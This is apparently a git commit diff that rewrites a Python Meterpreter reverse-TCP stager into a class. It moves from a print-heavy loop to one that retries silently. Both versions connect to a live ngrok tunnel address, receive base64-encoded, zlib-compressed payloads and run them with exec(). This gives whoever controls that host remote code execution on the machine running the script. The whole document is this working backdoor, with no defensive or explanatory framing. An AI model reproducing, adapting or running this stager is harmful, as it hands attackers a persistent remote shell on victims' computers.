cdbef79d240ac94fa39b23fb52ca905c93d57e20
mustafa0s <70377466+ac2f@users.noreply.github.com>
2022-08-18 13:40:49 -0700

    Update python-meterpreter-reverse_tcp.py

--- python-meterpreter-reverse_tcp.py
+++ python-meterpreter-reverse_tcp.py
@@ -1,36 +1,56 @@
-import socket,zlib,base64,struct,time
-s=socket.socket(2,socket.SOCK_STREAM)
+import socket
+import zlib
+import base64
+import struct
+import time
 
-host = "2.tcp.eu.ngrok.io:11843";
-for x in range(10):
-    try:
-        
-        s.connect((host.split(":")[0],int(host.split(":")[1])))
-        print("Connected")
-        break
-    except Exception as e:
-        print(e)
-        time.sleep(5)
-while True:
-    try:
-        l=struct.unpack('>I',s.recv(4))[0]
-        d=s.recv(l)
-        while len(d)<l:
-            d+=s.recv(l-len(d))
-        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
-    except KeyboardInterrupt:
-        exit()
-    except Exception as e:
-        print("e2", str(e))
-        if ("WinError 10057" in str(e)):
-            print("e2 check true")
-            while True:
-                try:
-                    s.connect((host.split(":")[0],int(host.split(":")[1])))
-                    print("Connected")
-                    break
-                except Exception as e:
-                    print("e3", e)
-                    time.sleep(5)
-            continue
-        print("e2 check false")
+host = "2.tcp.eu.ngrok.io:11843"
+
+
+class Client:
+    def __init__(self, host: str, port: int | str):
+        self.host: str = host
+        self.port: int = int(str(port))
+        self.socket: socket.socket = socket.socket(2, socket.SOCK_STREAM)
+        self.connected: bool = False
+
+    def isSocketClosed(self) -> bool:
+        try:
+            self.socket.send(b"hello world")
+            return True
+        except ConnectionResetError:
+            return True
+        except (BlockingIOError, Exception):
+            pass
+        return False
+
+    def waitUntilConnect(self, maxTry: int = 0):
+        c: int = 0
+        while (maxTry == 0 or c < maxTry):
+            try:
+                self.socket: socket.socket = socket.socket(
+                    2, socket.SOCK_STREAM)
+                self.socket.connect((self.host, self.port))
+                # print("Connected")
+                break
+            except Exception as e:
+                pass
+                # print('An exception occurred.', e)
+            c += 1
+
+    def mainLoop(self):
+        while True:
+            if (self.isSocketClosed()):
+                self.waitUntilConnect()
+            try:
+                l = struct.unpack('>I', self.socket.recv(4))[0]
+                d = self.socket.recv(l)
+                while len(d) < l:
+                    d += self.socket.recv(l-len(d))
+                exec(zlib.decompress(base64.b64decode(d)), {'s': self.socket})
+            except:
+                self.waitUntilConnect()
+
+
+client: Client = Client(host.split(":")[0], host.split(":")[1])
+client.mainLoop()
